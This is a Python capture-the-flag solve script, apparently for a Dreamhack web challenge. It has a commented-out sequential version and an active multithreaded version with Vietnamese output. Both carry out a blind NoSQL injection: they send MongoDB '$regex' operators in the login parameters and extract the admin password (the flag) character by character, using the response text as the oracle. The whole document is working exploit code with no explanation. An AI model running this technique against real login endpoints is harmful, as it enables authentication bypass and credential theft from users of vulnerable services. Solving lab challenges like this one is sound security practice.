# import string
# import requests
# import re

# url = "http://host3.dreamhack.games:17396"
# charset = string.ascii_letters + string.digits + "{}"

# FLAG = ""

# for i in range(36):
#     flag = False
#     for char in charset:
#         escaped_flag_so_far = re.escape(FLAG + char)
#         remaining_padding = 36 - i - 1
        
#         params = {
#             "uid[$regex]": "^adm",
#             "upw[$regex]": f"^{escaped_flag_so_far}.{{{remaining_padding}}}$"
#         }
        
#         response = requests.get(url=url + '/login', params=params, proxies={'http':'http://localhost:8080', 'https':'https://localhost:8080'})
        
#         if "admin" in response.text:
#             flag = True
#             FLAG += char
#             print(f"[+] Found: {FLAG}")
#             break
#     if not flag: 
#         print("No more characters found. Exiting.")
#         break
# print(f"\n[★] Final Flag: {FLAG}")

import string
import requests
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://host3.dreamhack.games:17396"
charset = string.ascii_letters + string.digits + "{}"

flag_list = [""] * 36
proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}

def check_char(pos, char):
    escaped_char = re.escape(char)
    regex_pattern = f"^.{{{pos}}}{escaped_char}" if pos > 0 else f"^{escaped_char}"
    
    params = {
        "uid[$regex]": "^adm",
        "upw[$regex]": regex_pattern
    }
    
    try:
        response = requests.get(url=url + '/login', params=params, proxies=proxies, timeout=5)
        if "admin" in response.text:
            return pos, char
    except Exception:
        pass
    return pos, None

with ThreadPoolExecutor(max_workers=20) as executor:
    futures = []
    
    for i in range(36):
        for char in charset:
            futures.append(executor.submit(check_char, i, char))
            
    for future in as_completed(futures):
        pos, found_char = future.result()
        if found_char:
            flag_list[pos] = found_char
            tien_do = "".join([c if c != "" else "_" for c in flag_list])
            print(f"[+] Tìm thấy tại vị trí {pos:02d}: '{found_char}' -> {tien_do}")

chuoi_flag = "".join(flag_list)
print(f"\n[★] Kết quả: {chuoi_flag}")
